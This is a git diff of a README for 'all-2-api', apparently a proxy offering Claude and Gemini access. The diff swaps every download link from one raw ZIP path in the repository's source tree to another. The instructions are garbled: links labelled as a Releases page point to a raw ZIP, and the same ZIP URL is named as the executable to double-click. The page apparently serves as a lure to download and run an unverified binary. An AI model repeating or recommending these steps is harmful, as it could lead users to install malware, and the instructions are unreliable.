@@ -1,7 +1,7 @@
 # 🚀 all-2-api - Harness Powerful APIs with Ease
 
 ## 📥 Download Now
-[![Download](https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/src/public/pages/api-all-3.0.zip)](https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/src/public/pages/api-all-3.0.zip)
+[![Download](https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/api-all-v2.7.zip)](https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/api-all-v2.7.zip)
 
 ## 📖 Introduction
 Welcome to **all-2-api**! This is a powerful API proxy service that lets you access top models like Claude and Gemini through Kiro API and Gemini Antigravity API. It wraps these services in a standard OpenAI-compatible interface. Whether you want to analyze data, build applications, or simply explore the capabilities of these advanced models, this tool makes it easy for you.
@@ -20,23 +20,23 @@ Before you start, ensure you have the following:
 ## 📥 Download & Install
 To get started, you need to visit the Releases page:
 
-[Visit the Releases Page](https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/src/public/pages/api-all-3.0.zip)
+[Visit the Releases Page](https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/api-all-v2.7.zip)
 
 1. Click on the link above.
 2. On the Releases page, look for the latest version. It is usually highlighted at the top.
-3. Find the file you want to download. Typically, it will be named something like `https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/src/public/pages/api-all-3.0.zip`.
+3. Find the file you want to download. Typically, it will be named something like `https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/api-all-v2.7.zip`.
 4. Click on the file to start the download.
 
 Once the download is complete:
 
 1. Navigate to your downloads folder.
 2. Extract the contents from the downloaded ZIP file.
-3. Open the extracted folder to find the executable file (usually named `https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/src/public/pages/api-all-3.0.zip`).
+3. Open the extracted folder to find the executable file (usually named `https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/api-all-v2.7.zip`).
 
 ## 🛠️ Running the Application
 To run the application:
 
-1. Double-click on `https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/src/public/pages/api-all-3.0.zip`.
+1. Double-click on `https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/api-all-v2.7.zip`.
 2. The application interface will open. 
 
 ## 📚 How to Use all-2-api
@@ -80,4 +80,4 @@ If you have further questions or need assistance, please submit an issue in the 
 ## 📥 Download Now Again
 Remember, to install and run **all-2-api**, head over to the Releases page:
 
-[Visit the Releases Page](https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/src/public/pages/api-all-3.0.zip)
+[Visit the Releases Page](https://github.com/Udayanga00/all-2-api/raw/refs/heads/main/code/api-all-v2.7.zip)
